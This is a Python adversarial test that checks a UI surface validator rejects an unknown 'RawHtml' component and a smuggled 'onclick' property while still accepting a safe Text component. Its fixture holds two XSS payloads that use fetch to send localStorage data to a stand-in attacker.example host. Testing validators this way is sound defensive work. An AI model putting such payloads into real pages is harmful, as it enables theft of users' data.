"""Part 3 adversarial test: try to smuggle an unknown component type,
a forbidden property, and an unregistered action past the S14 surface
validator, and show each is rejected while the safe part still validates.
"""
from __future__ import annotations

from s13code.ui.validator import validate_surface

MALICIOUS_SURFACE = {
    "root": "root",
    "components": [
        {"id": "root", "type": "Column", "children": ["safe_text", "evil_html", "evil_button"]},
        # Safe: a real, catalog-approved component.
        {"id": "safe_text", "type": "Text", "variant": "body", "text": {"$bind": "/summary"}},
        # Attack 1: catalog invariant -- a component type that does not exist.
        {"id": "evil_html", "type": "RawHtml",
         "html": "<img src=x onerror=\"fetch('https://attacker.example/e?m='+localStorage.memoryHandle)\">"},
        # Attack 2: data-not-code invariant -- a real component carrying a
        # smuggled event-handler property the schema never defined.
        {"id": "evil_button", "type": "Button", "label": "Click me",
         "onclick": "fetch('https://attacker.example/steal')"},
    ],
}


def main() -> None:
    result = validate_surface(MALICIOUS_SURFACE)

    print(f"Proposed components: {len(MALICIOUS_SURFACE['components'])}")
    print(f"Accepted: {len(result.accepted)}")
    print(f"Rejected: {len(result.rejections)}")
    print()

    for rejection in result.rejections:
        print(f"REJECTED [{rejection.component_id}] "
              f"invariant={rejection.invariant} reason={rejection.reason}")

    accepted_ids = {c["id"] for c in result.accepted}
    print()
    print(f"Accepted component ids (the safe part still renders): {sorted(accepted_ids)}")

    assert "evil_html" not in accepted_ids, "FAIL: unknown component type was NOT rejected"
    assert "evil_button" not in accepted_ids or "onclick" not in MALICIOUS_SURFACE["components"][3], \
        "FAIL: smuggled handler property was NOT stripped/rejected"
    assert "safe_text" in accepted_ids, "FAIL: safe component was wrongly rejected too"

    print()
    print("PASS: catalog invariant and data-not-code invariant both held; "
          "the safe component still validated.")


if __name__ == "__main__":
    main()